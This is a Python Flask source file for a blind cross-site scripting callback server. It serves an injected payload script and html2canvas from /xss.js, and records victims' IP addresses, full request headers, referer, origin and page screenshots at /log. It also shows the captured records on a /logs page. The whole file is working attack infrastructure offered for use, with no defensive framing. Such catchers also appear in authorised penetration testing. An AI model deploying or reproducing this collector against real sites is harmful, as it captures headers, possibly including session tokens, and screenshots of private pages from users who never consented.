import os
from flask import Flask, request, jsonify, send_from_directory, render_template_string
import datetime

app = Flask(__name__, static_url_path='/static')

logs = []

@app.route('/')
def home():
    return "Blind XSS Logger Active"

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    log_entry = {
        'time': str(datetime.datetime.now()),
        'ip': request.remote_addr,
        'headers': dict(request.headers),
        'screenshot': data.get('screenshot'),
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer'),
        'origin': request.headers.get('Origin')
    }
    logs.append(log_entry)
    print(f"New log: {log_entry}")
    return jsonify({"status": "ok"}), 200

@app.route('/logs')
def view_logs():
    # Simple HTML page to list all logs with screenshot images
    html = """
    <html>
    <head><title>Blind XSS Logs</title></head>
    <body>
      <h1>Blind XSS Logs</h1>
      {% for log in logs %}
        <div style="margin-bottom:30px; padding:10px; border:1px solid #ccc;">
          <b>Time:</b> {{ log.time }}<br>
          <b>IP:</b> {{ log.ip }}<br>
          <b>User Agent:</b> {{ log.user_agent }}<br>
          <b>Referer:</b> {{ log.referer }}<br>
          <b>Origin:</b> {{ log.origin }}<br>
          <b>Headers:</b> <pre>{{ log.headers }}</pre>
          {% if log.screenshot %}
            <b>Screenshot:</b><br>
            <img src="{{ log.screenshot }}" style="max-width:300px; border:1px solid #333;" />
          {% else %}
            <b>Screenshot:</b> No screenshot<br>
          {% endif %}
        </div>
      {% else %}
        <p>No logs yet.</p>
      {% endfor %}
    </body>
    </html>
    """
    return render_template_string(html, logs=logs)

@app.route('/xss.js')
def serve_xss():
    return send_from_directory('static', 'xss.js')

@app.route('/html2canvas.min.js')
def serve_html2canvas():
    return send_from_directory('static', 'html2canvas.min.js')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
